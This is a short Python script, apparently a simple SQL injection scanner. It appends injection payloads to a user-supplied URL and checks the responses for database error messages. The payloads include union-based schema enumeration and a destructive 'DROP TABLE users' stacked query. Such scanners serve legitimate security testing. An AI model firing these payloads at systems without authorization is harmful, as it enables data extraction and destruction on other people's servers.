import requests

def scan_for_sql_injection(url):
    vulnerable_urls = []

    # SQL injection payloads to append to the URL
    payloads = [
        "'",                          # Basic single quote injection
        "1' OR '1'='1",               # Boolean-based SQL injection
        "1'; DROP TABLE users; --",   # SQL injection with potential malicious intent
        "1' AND 1=0 UNION SELECT NULL, TABLE_NAME FROM information_schema.tables --",  # Union-based injection
        "1' AND 1=0 UNION SELECT NULL, CONCAT(table_name, column_name) FROM information_schema.columns --"  # Information schema extraction
        # Add more payloads as needed
    ]

    # SQL error keywords to detect
    error_keywords = [
        'SQL syntax', 'Internal Server Error','You have an error', 'Warning: mysql_', 'Unclosed quotation mark', 'quoted string not properly terminated'
        # Add more SQL error indicators as needed
    ]

    print(f"Starting SQL injection scan on URL")

    for payload in payloads:
        try:
            # Construct the URL with the payload appended
            test_url = f"{url}{payload}"
            print(f"Testing with payload: {payload}")
            response = requests.get(test_url)
            print(f"URL requested: {response.url}")
            print(f"Response status code: {response.status_code}")

            # Check response for SQL error or unintended data access indicators
            if any(keyword in response.text for keyword in error_keywords):
                print(f"[VULNERABLE] SQL Injection detected: {test_url}")
                vulnerable_urls.append((test_url, 'GET', payload))
            else:
                print(f"[SAFE] No SQL Injection detected with payload: {payload}")
        except requests.RequestException as e:
            print(f"Request error occurred: {str(e)}")
        except Exception as e:
            print(f"General error occurred: {str(e)}")

    if not vulnerable_urls:
        print("No SQL Injection vulnerabilities detected.")
    else:
        print("\n\n\n\nVulnerable URLs & The Results are:")
        for vuln_url, vuln_method, vuln_payload in vulnerable_urls:
            print(f"- Method: {vuln_method}, URL: {vuln_url}, Payload: {vuln_payload}")

    return vulnerable_urls

if __name__ == "__main__":
    # Example usage:
    target_url = input("Please enter the target URL: ")  # Replace with your target URL
    vulnerable_urls = scan_for_sql_injection(target_url)